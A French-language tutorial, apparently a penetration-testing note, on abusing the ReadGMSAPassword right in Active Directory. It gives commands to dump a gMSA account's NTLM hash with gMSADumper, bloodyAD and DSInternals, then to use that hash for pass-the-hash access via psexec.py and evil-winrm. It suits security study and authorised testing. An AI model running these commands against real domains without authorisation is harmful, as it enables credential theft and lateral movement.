`ReadGMSAPassword` c'est un principe assez différent  — ici il n'y a rien à "ajouter" ou "écrire", c'est un droit de **lecture directe** qui te donne accès au mot de passe en clair (enfin, sous forme utilisable) d'un compte gMSA.

## Le concept

Un **gMSA** (group Managed Service Account) est un compte de service géré automatiquement par Active Directory : son mot de passe est généré aléatoirement, complexe, et **changé automatiquement tous les 30 jours** par le DC. Personne ne le "connaît" au sens classique — il est stocké dans l'attribut `msDS-ManagedPassword` de l'objet AD.

Le hic : AD permet de définir **quels comptes/groupes ont le droit de lire cet attribut** (via l'attribut `msDS-GroupMSAMembership` ou l'ACL sur `msDS-ManagedPassword`). Si ton user courant (ou un groupe dont il est membre) figure dans cette liste, tu peux lire le mot de passe du gMSA directement, le décoder, et l'utiliser comme n'importe quel credential.

## Pourquoi c'est intéressant

Les gMSA sont souvent utilisés pour faire tourner des services, des tâches planifiées, de l'IIS, du SQL Server, etc. — parfois avec des **privilèges élevés** sur des machines ou dans le domaine. Si tu peux lire le mot de passe, tu obtiens un accès complet sous cette identité, sans avoir eu besoin de le cracker.

## Commandes Linux

**`gMSADumper.py`** (le plus utilisé, fait tout automatiquement) :

ref de l'outil : https://github.com/micahvandeusen/gMSADumper
```bash
gMSADumper.py -u <user> -p '<password>' -d <domain>
```
Il liste tous les gMSA lisibles par ton compte et sort directement le hash NTLM (et souvent le mot de passe déchiffré si possible).

**Avec `bloodyAD`** :
```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' get object <gmsa_account>$ --attr msDS-ManagedPassword
```
(il faut ensuite décoder le blob `MSDS-MANAGEDPASSWORD_BLOB` toi-même — gMSADumper fait ça pour toi, donc à privilégier).

## Commandes Windows

**Avec le module PowerShell natif `DSInternals`** :
```powershell
Import-Module DSInternals
Get-ADServiceAccount -Identity '<gmsa_name>' -Properties 'msDS-ManagedPassword' | 
Get-ADServiceAccountManagedPassword | ConvertTo-NTHash
```

**Avec le module AD natif seul** (donne le blob brut, moins pratique) :
```powershell
Get-ADServiceAccount -Identity '<gmsa_name>' -Properties msDS-ManagedPassword
```

## Utilisation du hash récupéré

Une fois le hash NTLM en main, tu peux directement faire du **pass-the-hash** :
```bash
psexec.py <domain>/<gmsa_name>$@<target_ip> -hashes :<NTLM_hash>
```
ou t'authentifier sur des services SMB/WinRM avec `evil-winrm` :
```bash
evil-winrm -i <target_ip> -u '<gmsa_name>$' -H <NTLM_hash>
```

## Point important à retenir

Contrairement à Kerberoasting où tu dois cracker offline (et ça peut échouer si le mot de passe est fort), avec ReadGMSAPassword tu obtiens le hash **directement et immédiatement** — pas de brute-force nécessaire, c'est un accès quasi instantané si le droit est mal configuré.

